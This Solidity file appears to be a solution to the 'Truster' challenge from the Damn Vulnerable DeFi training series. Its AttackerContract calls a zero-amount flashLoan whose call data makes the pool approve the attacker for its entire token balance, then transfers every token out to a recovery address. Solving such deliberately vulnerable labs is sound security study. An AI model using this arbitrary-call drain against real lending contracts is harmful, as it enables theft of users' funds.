// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract AttackerContract {
    TrusterLenderPool public pool;
    DamnValuableToken public token;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token) {
        pool = _pool;
        token = _token;
    }

    function attack(address recovery) external {
        uint balanceBefore = token.balanceOf(address(pool));
        // call falshLoan on the pool
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balanceBefore // Approve the attacker contract to spend all tokens in the pool
        );

        // Flash loan the tokens from the pool
        pool.flashLoan(
            0, // No need to borrow any tokens
            address(this), // The attacker contract is the borrower
            address(token), // The target is the token 
            data // The data contains the approve call
        );

        // Now the attacker contract can transfer tokens from the pool to recovery address
        token.transferFrom(
            address(pool),
            recovery, // Transfer to recovery address
            balanceBefore // Transfer all tokens in the pool
        );

    }
}